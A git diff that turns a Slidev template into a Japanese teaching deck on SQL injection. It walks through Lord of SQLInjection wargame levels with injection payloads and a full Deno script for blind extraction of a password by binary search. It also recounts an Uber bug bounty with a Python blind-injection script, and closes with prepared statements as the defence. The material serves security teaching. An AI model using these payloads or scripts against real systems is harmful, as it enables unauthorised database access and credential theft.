@@ -1,24 +1,22 @@
 ---
 # try also 'default' to start simple
-theme: seriph
+theme: apple-basic
 # random image from a curated Unsplash collection by Anthony
 # like them? see https://unsplash.com/collections/94734566/slidev
 background: https://source.unsplash.com/collection/94734566/1920x1080
 # apply any windi css classes to the current slide
-class: 'text-center'
+class: "text-center"
 # https://sli.dev/custom/highlighters.html
 highlighter: shiki
 # some information about the slides, markdown enabled
 info: |
-  ## Slidev Starter Template
-  Presentation slides for developers.
+    ## Slidev Starter Template
+    Presentation slides for developers.
 
-  Learn more at [Sli.dev](https://sli.dev)
+    Learn more at [Sli.dev](https://sli.dev)
 ---
 
-# Welcome to Slidev
-
-Presentation slides for developers
+# SQL Injection
 
 <div class="pt-12">
   <span @click="$slidev.nav.next" class="px-2 p-1 rounded cursor-pointer" hover="bg-white bg-opacity-10">
@@ -28,7 +26,7 @@ Presentation slides for developers
 
 <a href="https://github.com/slidevjs/slidev" target="_blank" alt="GitHub"
   class="abs-br m-6 text-xl icon-btn opacity-50 !border-none !hover:text-white">
-  <carbon-logo-github />
+<carbon-logo-github />
 </a>
 
 <!--
@@ -37,290 +35,413 @@ The last comment block of each slide will be treated as slide notes. It will be 
 
 ---
 
-# What is Slidev?
+# SQL Injection とは?
 
-Slidev is a slides maker and presenter designed for developers, consist of the following features
+SQL Injection とは
 
-- 📝 **Text-based** - focus on the content with Markdown, and then style them later
-- 🎨 **Themable** - theme can be shared and used with npm packages
-- 🧑‍💻 **Developer Friendly** - code highlighting, live coding with autocompletion
-- 🤹 **Interactive** - embedding Vue components to enhance your expressions
-- 🎥 **Recording** - built-in recording and camera view
-- 📤 **Portable** - export into PDF, PNGs, or even a hostable SPA
-- 🛠 **Hackable** - anything possible on a webpage
+> SQL インジェクション（英: SQL Injection）とは、アプリケーションのセキュリティ上の不備を意図的に利用し、アプリケーションが想定しない SQL 文を実行させることにより、データベースシステムを不正に操作する攻撃方法のこと。また、その攻撃を可能とする脆弱性のことである。\[[Wikipedia](https://ja.wikipedia.org/wiki/SQLインジェクション)\]
 
-<br>
-<br>
+---
 
-Read more about [Why Slidev?](https://sli.dev/guide/why)
+# Load of SQLInjection
 
-<!--
-You can have `style` tag in markdown to override the style for the current page.
-Learn more: https://sli.dev/guide/syntax#embedded-styles
--->
+SQL Injection をアドベンチャーゲームに見立てて遊べる Web サイト。
+
+https://los.rubiya.kr/
+
+<img src="/image/screenshot_losi1.png">
+
+---
+
+# Load of SQLInjection
+
+遊び方
+
+-   実行されるソースコードが表示されている
+-   このソースコードで solve 関数が実行されるようにパラメータを渡す(下のコードだと id と pw)
+
+```php {all|5-6|7|9-10|all}
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']) solve("gremlin");
+  highlight_file(__FILE__);
+?>
+```
+
+---
+
+# 1 問目を解いてみる
+
+## Goal
+
+以下のクエリで 1 行以上を SELECT
+
+```sql
+select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'
+```
+
+<v-click>
+
+## Answer
+
+以下のように入力
+
+```
+https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php?id=' or true--%20
+```
+
+これで以下の SQL が実行されることになる
+
+```sql
+select id from prob_gremlin where id='' or true-- and pw=''
+```
+
+</v-click>
+
+<div v-click>
+すべての行が SELECT 出来た！
+</div>
+
+---
+
+# 他の問題
+
+```php {all|6|8-9|11-14|all}
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if($result['id']) echo "<h2>Hello admin</h2>";
+
+  $_GET[pw] = addslashes($_GET[pw]);
+  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
+  highlight_file(__FILE__);
+?>
+```
+
+<div v-click>
+正しいPWを調べなければいけない！！
+</div>
+
+---
+
+# どう解く？
+
+## ポイント
+
+以下が結果を返せれば、それを知ることが出来る
+
+```sql
+select id from prob_orc where id='admin' and pw='{$_get[pw]}'
+```
+
+---
+
+# PW の長さ
+
+## length()を使う
+
+```sql
+select id from prob_orc where id='admin' and pw='' or 1 < length(pw) and id='admin'
+```
+
+上記のクエリは id が admin で pw の長さが 1 より大きいならば行を返す
+
+<div v-click>
+
+```sql
+select id from prob_orc where id='admin' and pw='' or 100 < length(pw) and id='admin'
+```
+
+上記のクエリは id が admin で pw の長さが 100 より大きくなければ行を返さない
+
+</div>
+
+<div v-click>
+数値を変えていくことでPWの長さが得られる！！
+</div>
+
+---
+
+# PW の長さ
+
+<div>
+
+```ts
+let left = 0;
+let right = 100;
+while (left + 1 != right) {
+    const val = Math.round((right - left) / 2) + left;
+    if (
+        judge(await sendRequest(`pw=' or length(pw) <= ${val} and id='admin`))
+    ) {
+        right = val;
+    } else {
+        left = val;
+    }
+}
+
+const length = right;
+console.log(`length=${length}`);
+```
+
+</div>
+
+---
+
+# PW の特定
+
+## substring(), ascii()
+
+```sql
+select id from prob_orc where id='admin' and pw='' or 122 > ascii(substring(pw, 1, 1)) and id='admin'
+```
+
+上記のクエリは id が admin で pw の 1 文字目のアスキーコードが 122(z)未満なら行を返す
+
+<div v-click>
+
+```sql
+select id from prob_orc where id='admin' and pw='' or 48 > ascii(substring(pw, 1, 1)) and id='admin'
+```
+
+上記のクエリは id が admin で pw の 1 文字目のアスキーコードが 48(0)未満じゃなければ行を返さない
+
+</div>
+
+<div v-click>
+数値を変えていくことでPWが得られる！！
+</div>
+
+---
+
+# PW の特定
+
+```ts
+let i = 0;
+let result = "";
+while (i != length) {
+    left = 0;
+    right = 256;
+    while (left + 1 != right) {
+        const val = Math.round((right - left) / 2) + left;
+        if (
+            judge(
+                await sendRequest(
+                    `pw=' or ${val} > ascii(substr(pw,${
+                        i + 1
+                    },1)) and id='admin`
+                )
+            )
+        ) {
+            right = val;
+        } else {
+            left = val;
+        }
+    }
+    result += String.fromCharCode(left);
+    ++i;
+}
+```
+
+---
+
+# コード
+
+deno で実行
+
+```ts
+const SESSION_COOKIE = "flqhag5p3ht49enaoiceppm9o0";
+const TARGET_URL =
+    "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php";
+
+const sendRequest = async (query: string) => {
+    const response = await fetch(`${TARGET_URL}?${query}`, {
+        headers: { Cookie: `PHPSESSID=${SESSION_COOKIE}` }
+    });
+    return await response.text();
+};
+
+const judge = (text: string) => {
+    return text.match(/Hello admin/g)?.length == 1;
+};
+
+let left = 0;
+let right = 100;
+while (left + 1 != right) {
+    const val = Math.round((right - left) / 2) + left;
+    if (
+        judge(await sendRequest(`pw=' or length(pw) <= ${val} and id='admin`))
+    ) {
+        right = val;
+    } else {
+        left = val;
+    }
+}
+
+const length = right;
+console.log(`length=${length}`);
+
+let i = 0;
+let result = "";
+while (i != length) {
+    left = 0;
+    right = 256;
+    while (left + 1 != right) {
+        const val = Math.round((right - left) / 2) + left;
+        if (
+            judge(
+                await sendRequest(
+                    `pw=' or ${val} > ascii(substr(pw,${
+                        i + 1
+                    },1)) and id='admin`
+                )
+            )
+        ) {
+            right = val;
+        } else {
+            left = val;
+        }
+    }
+    result += String.fromCharCode(left);
+    ++i;
+}
+
+console.log(`pw=${result}`);
+```
 
 <style>
-h1 {
-  background-color: #2B90B6;
-  background-image: linear-gradient(45deg, #4EC5D4 10%, #146b8c 20%);
-  background-size: 100%;
-  -webkit-background-clip: text;
-  -moz-background-clip: text;
-  -webkit-text-fill-color: transparent; 
-  -moz-text-fill-color: transparent;
-}
+  .shiki-container {
+    height: 40vh;
+    code {
+      overflow: scroll;
+    }
+  }
 </style>
 
 ---
 
-# Navigation
+# 実際に起きた事例
 
-Hover on the bottom-left corner to see the navigation's controls panel, [learn more](https://sli.dev/guide/navigation.html)
+[リアルワールドバグハンティング (オライリージャパン)](https://www.oreilly.co.jp/books/9784873119212/)より
 
-### Keyboard Shortcuts
+## Uber での事例
 
-|     |     |
-| --- | --- |
-| <kbd>right</kbd> / <kbd>space</kbd>| next animation or slide |
-| <kbd>left</kbd> | previous animation or slide |
-| <kbd>up</kbd> | previous slide |
-| <kbd>down</kbd> | next slide |
+-   Uber からメール広告を受信
+-   購読解除のリンクに base64 エンコードされたパラメータが付与されていた
+-   そのパラメータは JSON 文字列で以下のようなものだった
 
-<!-- https://sli.dev/guide/animations.html#click-animations -->
-<img
-  v-click
-  class="absolute -bottom-9 -left-7 w-80 opacity-50"
-  src="https://sli.dev/assets/arrow-bottom-left.svg"
-/>
-<p v-after class="absolute bottom-23 left-45 opacity-30 transform -rotate-10">Here!</p>
+    -   ```json
+        { "user_id": "5755", "receiver": "orange@mymail" }
+        ```
 
----
-layout: image-right
-image: https://source.unsplash.com/collection/94734566/1920x1080
----
+-   以下のように変更した JSON 文字列の base64 エンコードしたものを送信
+    -   ```json
+        { "user_id": "5755 and sleep(12)=1", "receiver": "orange@mymail" }
+        ```
 
-# Code
-
-Use code snippets and get the highlighting directly!
-
-<!-- https://sli.dev/guide/syntax.html#line-highlighting -->
-
-```ts {all|2|1-6|9|all}
-interface User {
-  id: number
-  firstName: string
-  lastName: string
-  role: string
-}
-
-function updateUser(id: number, update: User) {
-  const user = getUser(id)
-  const newUser = {...user, ...update}  
-  saveUser(id, newUser)
-}
-```
-
-<arrow v-click="3" x1="400" y1="420" x2="230" y2="330" color="#564" width="3" arrowSize="1" />
-
----
-
-# Components
-
-<div grid="~ cols-2 gap-4">
-<div>
-
-You can use Vue components directly inside your slides.
-
-We have provided a few built-in components like `<Tweet/>` and `<Youtube/>` that you can use directly. And adding your custom components is also super easy.
-
-```html
-<Counter :count="10" />
-```
-
-<!-- ./components/Counter.vue -->
-<Counter :count="10" m="t-4" />
-
-Check out [the guides](https://sli.dev/builtin/components.html) for more.
-
-</div>
-<div>
-
-```html
-<Tweet id="1390115482657726468" />
-```
-
-<Tweet id="1390115482657726468" scale="0.65" />
-
-</div>
+<div v-click>
+12秒以上処理がかかるようになった！
 </div>
 
-
----
-class: px-20
 ---
 
-# Themes
+# DB の User の特定
 
-Slidev comes with powerful theming support. Themes can provide styles, layouts, components, or even configurations for tools. Switching between themes by just **one edit** in your frontmatter:
+user()は SQL のユーザーとホストを\<user\>@\<host\>の形式で返す。
+以下のような python のコードを実行してユーザーを特定したらしい
 
-<div grid="~ cols-2 gap-2" m="-t-2">
-
-```yaml
----
-theme: default
----
+```py {all|10|14-16|all}
+import json
+import string
+import requests
+from urllib import quote
+from base64 import b64encode
+base = string.digits + string.letters + '_-@.'
+payload ={ "user_id": "5755", "receiver": "blog.orange.tw" }
+for l in range(0, 30):
+  for i in base:
+    payload['user_id'] = "5755 and mid(user(),%d,1)='%c'#"%(l+1. i)
+    new_payload = json.dumps(payload)
+    new_payload = b64encode(new_payload)
+    r = requests.get('http://sctrack.email.uber.com.cn/track/unsubscribe.do?p='+quote(new_payload))
+    if len(r.content)>0:
+        print i,
+        break
 ```
 
-```yaml
----
-theme: seriph
----
-```
-
-<img border="rounded" src="https://github.com/slidevjs/themes/blob/main/screenshots/theme-default/01.png?raw=true">
-
-<img border="rounded" src="https://github.com/slidevjs/themes/blob/main/screenshots/theme-seriph/01.png?raw=true">
-
-</div>
-
-Read more about [How to use a theme](https://sli.dev/themes/use.html) and
-check out the [Awesome Themes Gallery](https://sli.dev/themes/gallery.html).
-
----
-preload: false
 ---
 
-# Animations
+# 結果
 
-Animations are powered by [@vueuse/motion](https://motion.vueuse.org/).
+-   ユーザー名とホストが sendcloud_w@10.9.79.210, DB 名が sendcloud と判明
+-   Uber に報告すると、自社サーバーではこの事象は発生しないが、サードパーティのサーバーで発生
+-   Uber はこのバグ報告に対して$4,000 の支払い
+-   バグの報告日は 2016/7/8(そんなに昔じゃない)
 
-```html
-<div
-  v-motion
-  :initial="{ x: -80 }"
-  :enter="{ x: 0 }">
-  Slidev
-</div>
-```
+<br/>
+<div v-click >
 
-<div class="w-60 relative mt-6">
-  <div class="relative w-40 h-40">
-    <img
-      v-motion
-      :initial="{ x: 800, y: -100, scale: 1.5, rotate: -50 }"
-      :enter="final"
-      class="absolute top-0 left-0 right-0 bottom-0"
-      src="https://sli.dev/logo-square.png"
-    />
-    <img
-      v-motion
-      :initial="{ y: 500, x: -100, scale: 2 }"
-      :enter="final"
-      class="absolute top-0 left-0 right-0 bottom-0"
-      src="https://sli.dev/logo-circle.png"
-    />
-    <img
-      v-motion
-      :initial="{ x: 600, y: 400, scale: 2, rotate: 100 }"
-      :enter="final"
-      class="absolute top-0 left-0 right-0 bottom-0"
-      src="https://sli.dev/logo-triangle.png"
-    />
-  </div>
-
-  <div 
-    class="text-5xl absolute top-14 left-40 text-[#2B90B6] -z-1"
-    v-motion
-    :initial="{ x: -80, opacity: 0}"
-    :enter="{ x: 0, opacity: 1, transition: { delay: 2000, duration: 1000 } }">
-    Slidev
-  </div>
-</div>
-
-<!-- vue script setup scripts can be directly used in markdown, and will only affects current page -->
-<script setup lang="ts">
-const final = {
-  x: 0,
-  y: 0,
-  rotate: 0,
-  scale: 1,
-  transition: {
-    type: 'spring',
-    damping: 10,
-    stiffness: 20,
-    mass: 2
-  }
-}
-</script>
-
-<div
-  v-motion
-  :initial="{ x:35, y: 40, opacity: 0}"
-  :enter="{ y: 0, opacity: 1, transition: { delay: 3500 } }">
-
-[Learn More](https://sli.dev/guide/animations.html#motion)
+<p style="font-size:1.5em"> 有名な会社でも起こりうるし、昔はそんなハッキングも出来たよねという話ではない。</p>
 
 </div>
 
 ---
 
-# LaTeX
+# どうしたらよいのか？
 
-LaTeX is supported out-of-box powered by [KaTeX](https://katex.org/).
+## Prepared Statement
 
-<br>
+実行したい SQL をコンパイルした 一種のテンプレートのようなものです。パラメータ変数を使用することで SQL をカスタマイズすることが可能
 
-Inline $\sqrt{3x-1}+(1+x)^2$
-
-Block
-$$
-\begin{array}{c}
-
-\nabla \times \vec{\mathbf{B}} -\, \frac1c\, \frac{\partial\vec{\mathbf{E}}}{\partial t} &
-= \frac{4\pi}{c}\vec{\mathbf{j}}    \nabla \cdot \vec{\mathbf{E}} & = 4 \pi \rho \\
-
-\nabla \times \vec{\mathbf{E}}\, +\, \frac1c\, \frac{\partial\vec{\mathbf{B}}}{\partial t} & = \vec{\mathbf{0}} \\
-
-\nabla \cdot \vec{\mathbf{B}} & = 0
-
-\end{array}
-$$
-
-<br>
-
-[Learn more](https://sli.dev/guide/syntax#latex)
+-   クエリのパース (あるいは準備) が必要なのは最初の一回だけで、 同じパラメータ (あるいは別のパラメータ) を指定して何度でも クエリを実行することができる。解析/コンパイル/最適化 の繰り返しを避けることができ、高速に動作する
+-   プリペアドステートメントに渡すパラメータは、引用符で括る必要がない。 アプリケーションで明示的にプリペアドステートメントを使用するように すれば、SQL インジェクションは発生しない。
 
 ---
 
-# Diagrams
+# Prepared Statement
 
-You can create diagrams / graphs from textual descriptions, directly in your Markdown.
+## PHP での例
 
-<div class="grid grid-cols-2 gap-4 pt-4 -mb-6">
+```php{all|2-4|7-9|12-14}
+<?php
+$stmt = $dbh->prepare("INSERT INTO REGISTRY (name, value) VALUES (?, ?)");
+$stmt->bindParam(1, $name);
+$stmt->bindParam(2, $value);
 
-```mermaid {scale: 0.9}
-sequenceDiagram
-    Alice->John: Hello John, how are you?
-    Note over Alice,John: A typical interaction
+// 行を挿入します
+$name = 'one';
+$value = 1;
+$stmt->execute();
+
+// パラメータを変更し、別の行を挿入します
+$name = 'two';
+$value = 2;
+$stmt->execute();
+?>
 ```
 
-```mermaid {theme: 'neutral', scale: 0.8}
-graph TD
-B[Text] --> C{Decision}
-C -->|One| D[Result 1]
-C -->|Two| E[Result 2]
-```
-
-</div>
-
-[Learn More](https://sli.dev/guide/syntax.html#diagrams)
-
+参考: https://www.php.net/manual/ja/pdo.prepared-statements.php
 
 ---
-layout: center
-class: text-center
----
 
-# Learn More
+# まとめ
 
-[Documentations](https://sli.dev) / [GitHub Repo](https://github.com/slidevjs/slidev)
+-   SQL Injection は不正に SQL を実行する攻撃手法
+-   身近な問題で普段書いているコードでも起こりうる
+-   Prepared Statement は対策として効果的
+
+DB 周りのコードを書くときには意識してみよう!!
